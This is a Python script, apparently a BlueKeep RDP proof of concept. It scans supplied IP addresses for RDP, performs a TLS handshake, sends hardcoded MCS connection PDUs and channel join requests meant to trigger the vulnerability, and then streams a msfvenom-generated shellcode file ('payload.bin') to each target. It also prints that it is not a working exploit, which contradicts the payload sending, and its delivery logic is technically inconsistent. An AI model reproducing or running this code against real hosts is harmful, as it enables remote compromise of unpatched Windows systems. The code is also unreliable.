#!/usr/bin/env python
import sys
import socket
import binascii
import argparse
import impacket

from OpenSSL import *
from impacket.structure import Structure

# impacket structures
class TPKT(Structure):
    commonHdr = (
        ('Version', 'B=3'),
        ('Reserved', 'B=0'),
        ('Length', '>H=len(TPDU)+4'),
        ('_TPDU', '_-TPDU', 'self["Length"]-4'),
        ('TPDU', ':=""'),
    )


class TPDU(Structure):
    commonHdr = (
        ('LengthIndicator', 'B=len(VariablePart)+1'),
        ('Code', 'B=0'),
        ('VariablePart', ':=""'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data)
        self['VariablePart'] = ''


class CR_TPDU(Structure):
    commonHdr = (
        ('DST-REF', '<H=0'),
        ('SRC-REF', '<H=0'),
        ('CLASS-OPTION', 'B=0'),
        ('Type', 'B=0'),
        ('Flags', 'B=0'),
        ('Length', '<H=8'),
    )


class DATA_TPDU(Structure):
    commonHdr = (
        ('EOT', 'B=0x80'),
        ('UserData', ':=""'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data)
        self['UserData'] = ''


class RDP_NEG_REQ(CR_TPDU):
    structure = (
        ('requestedProtocols', '<L'),
    )

    def __init__(self, data=None):
        CR_TPDU.__init__(self, data)
        if data is None:
            self['Type'] = 1


# packing and unpacking binary data
class Packer(object):

    def __init__(self, packet):
        self.packet = packet

    def bin_unpack(self):
        return binascii.unhexlify(self.packet)

    def bin_pack(self):
        return binascii.hexlify(self.packet)


# PDU control sequence
class DoPduConnectionSequence(object):

    @staticmethod
    def connection_request_pdu():
        packet = "030000130ee000000000000100080003000000"
        return Packer(packet).bin_unpack()

    @staticmethod
    def domain_request_pdu():
        packet = "0300000c02f0800400010001"
        return Packer(packet).bin_unpack()

    @staticmethod
    def mcs_attach_user_request_pdu():
        packet = "0300000802f08028"
        return Packer(packet).bin_unpack()

    @staticmethod
    def mcs_connect_init_pdu():
        packet = (
            "030001ee02f0807f658201e20401010401010101ff30190201220201020201000201010201000201010202ffff02010230190201"
            "0102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201"
            "0204820181000500147c00018178000800100001c00044756361816a01c0ea000a0008008007380401ca03aa09040000b11d0000"
            "4400450053004b0054004f0050002d004600380034003000470049004b00000004000000000000000c0000000000000000000000"
            "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
            "0000000001ca01000000000018000f00af07620063003700380065006600360033002d0039006400330033002d00340031003938"
            "0038002d0039003200630066002d0000310062003200640061004242424207000100000056020000500100000000640000006400"
            "000004c00c00150000000000000002c00c001b0000000000000003c0680005000000726470736e6400000f0000c0636c69707264"
            "72000000a0c0647264796e766300000080c04d535f5431323000000000004d535f5431323000000000004d535f54313230000000"
            "00004d535f5431323000000000004d535f543132300000000000"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    def client_info_pdu():
        packet = (
            "0300016102f08064000703eb7081524000a1a509040904bb47030000000e00080000000000000042007200770041006600660079"
            "000000740074007400740000000000000002001c00310030002e0030002e0030002e003700360000000000000000000000400043"
            "003a005c00570049004e0044004f00570053005c00730079007300740065006d00330032005c006d007300740073006300610078"
            "002e0064006c006c000000a40100004d006f0075006e007400610069006e0020005300740061006e006400610072006400200054"
            "0069006d006500000000000000000000000000000000000000000000000b00000001000200000000000000000000004d006f0075"
            "006e007400610069006e0020004400610079006c0069006700680074002000540069006d00650000000000000000000000000000"
            "0000000000000000000300000002000200000000000000c4ffffff0100000006000000000064000000"
        )
        return Packer(packet).bin_unpack()

    @staticmethod
    def do_join_request():
        channels, pdu_channels = range(1001, 1008), []
        request_packets = {
            "req": "0300000c02f080380008",
        }
        for channel in channels:
            current_channel = request_packets["req"] + hex(channel)[2:].zfill(4)
            pdu_channels.append(Packer(current_channel).bin_unpack())
        return pdu_channels


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "-i", "--ip", dest="ipAddyList", metavar="IP[IP,IP,...]", default=None,
            help="provide a list of IP addresses separated by commas, or a single IP address"
        )
        parser.add_argument(
            "-p", "--port", type=int, dest="targetPort", metavar="PORT", default=3389,
            help="Specify the target port number (*default=3389)"
        )
        parser.add_argument(
            "-f", "--file", dest="ipAddyFile", metavar="FILE", default=None,
            help="provide a file containing IP addresses, one per line"
        )
        return parser.parse_args()


# constants
GIS_RDP = []
TPDU_CONNECTION_REQUEST = 0xe0
TYPE_RDP_NEG_REQ = 1
PROTOCOL_SSL = 1
SENT = "\033[91m -->\033[0m"
RECEIVE = "\033[94m<-- \033[0m"


def info(string):
    print("[ \033[32m+\033[0m ] {}".format(string))

# Envoie du payload au canal approprié
def send_payload(tls, payload_path):
    with open(payload_path, "rb") as payload:
        shellcode = payload.read()

    # Divisez le shellcode en plusieurs morceaux si nécessaire
    MAX_CHUNK_SIZE = 1600  # taille maximale par paquet
    for i in range(0, len(shellcode), MAX_CHUNK_SIZE):
        chunk = shellcode[i:i + MAX_CHUNK_SIZE]
        print(f"Sending chunk {i//MAX_CHUNK_SIZE + 1}")
        tls.sendall(chunk)

    print("Payload sent successfully.")

def error(string):
    print("[ \033[31m!\033[0m ] {}".format(string))


# connect the sockets and return the received data plus the connection in a Tuple
def socket_connection(obj, address, port=3389, receive_size=4000):
    try:
        session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        session.connect((address, port))
        session.sendall(obj)
        return session.recv(receive_size), session
    except Exception as e:
        error(e)
        return None


# check if the ip is running RDP or not
def check_rdp_service(address, port=3389):
    rdp_correlation_packet = Packer(
        "436f6f6b69653a206d737473686173683d75736572300d0a010008000100000000"
    ).bin_unpack()
    test_packet = DoPduConnectionSequence().connection_request_pdu()
    send_packet = test_packet + rdp_correlation_packet
    results = socket_connection(send_packet, address, port, receive_size=9126)
    if results is not None:
        if results[0]:
            info("successfully connected to RDP service on host: {}".format(address))
            GIS_RDP.append(address)
        else:
            error("unknown response provided from RDP session")
    else:
        error("unable to connect")


# start the connection like a boss
def start_rdp_connection(ip_addresses, port=3389):
    tpkt = TPKT()
    tpdu = TPDU()
    rdp_neg = RDP_NEG_REQ()
    rdp_neg['Type'] = TYPE_RDP_NEG_REQ
    rdp_neg['requestedProtocols'] = PROTOCOL_SSL
    tpdu['VariablePart'] = rdp_neg.getData()
    tpdu['Code'] = TPDU_CONNECTION_REQUEST
    tpkt['TPDU'] = tpdu.getData()
    for ip in ip_addresses:
        try:
            ip = ip.strip()
            results = socket_connection(tpkt.getData(), ip, port, receive_size=1024)
            ctx = SSL.Context(SSL.TLSv1_METHOD)
            tls = SSL.Connection(ctx, results[1])
            tls.set_connect_state()
            tls.do_handshake()

            # initialization packets (X.224)
            info("sending Client MCS Connect Initial PDU request packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().mcs_connect_init_pdu())
            returned_packet = tls.recv(8000)
            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))

            # erect domain and attach user to domain
            info("sending Client MCS Domain Request PDU packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().domain_request_pdu())
            info("sending Client MCS Attach User PDU request packet {}".format(SENT))
            tls.sendall(DoPduConnectionSequence().mcs_attach_user_request_pdu())
            returned_packet = tls.recv(8000)
            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))

            # send join requests on channels to trigger the vulnerability
            info("sending MCS Channel Join Request PDU packets {}".format(SENT))
            pdus = DoPduConnectionSequence().do_join_request()
            for pdu in pdus:
                tls.sendall(pdu)
                channel_number = int(Packer(pdu).bin_pack()[-4:], 16)
                returned_packet = tls.recv(1024)
                info("{} received {} bytes from channel {} on host: {}".format(
                    RECEIVE, hex(len(returned_packet)), channel_number, ip
                ))

            # Continue with further steps if needed (Security Exchange, Info, etc.)
            payload_path = "./payload.bin"  # Assurez-vous que le payload est généré avec msfvenom
            send_payload(tls, payload_path)

            info("closing the connection now, this is a PoC not a working exploit")
            results[1].close()
        except Exception as e:
            error("unable to connect: {}".format(e))
            continue


def main():
    to_scan = []
    opt = Parser().optparse()
    port = opt.targetPort
    if opt.ipAddyList is not None:
        for ip in opt.ipAddyList.split(","):
            to_scan.append(ip)
    elif opt.ipAddyFile is not None:
        try:
            open(opt.ipAddyFile).close()
        except IOError:
            error("that file doesn't exist?")
            sys.exit(1)
        with open(opt.ipAddyFile) as addresses:
            for address in addresses.readlines():
                to_scan.append(address.strip())
    else:
        info("python bluekeep_poc.py [-i IP[IP,IP,...]] [-p PORT] [-f FILE]")
        sys.exit(1)
    for scan in to_scan:
        info("verifying RDP service on: {}".format(scan))
        check_rdp_service(scan, port)
    info("starting RDP connection on {} targets".format(len(GIS_RDP)))
    print("\n")
    start_rdp_connection(GIS_RDP, port)


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
